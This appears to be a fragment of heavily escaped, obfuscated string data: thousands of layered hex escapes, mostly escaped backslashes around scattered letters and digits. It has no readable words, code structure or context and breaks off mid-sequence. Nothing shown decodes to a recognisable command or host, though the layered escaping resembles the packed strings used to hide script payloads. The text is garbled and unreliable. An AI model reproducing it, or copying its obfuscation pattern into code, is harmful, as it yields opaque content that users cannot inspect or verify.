c\x5c\x66\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x31\x6b\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x32\x7a\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x31\x6b\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x33\x78\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x32\x6d\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x31\x6c\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x32\x75\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x31\x4d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x71\x5c\x5c\x5c\x5c\x5a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x32\x6d\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x31\x6c\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x32\x7a\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x31\x4d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x71\x5c\x5c\x5c\x5c\x5a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x66\x5c\x5c\x5c\x5c\x31\x44\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x32\x6d\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x31\x6c\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x6b\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x31\x48\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x31\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x31\x48\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x31\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x32\x6c\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x31\x44\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x56\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x4c\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x58\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x31\x49\x5c\x5c\x5c\x5c\x33\x42\x5c\x5c\x5c\x5c\x32\x63\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x32\x62\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x31\x70\x5c\x5c\x5c\x5c\x31\x42\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x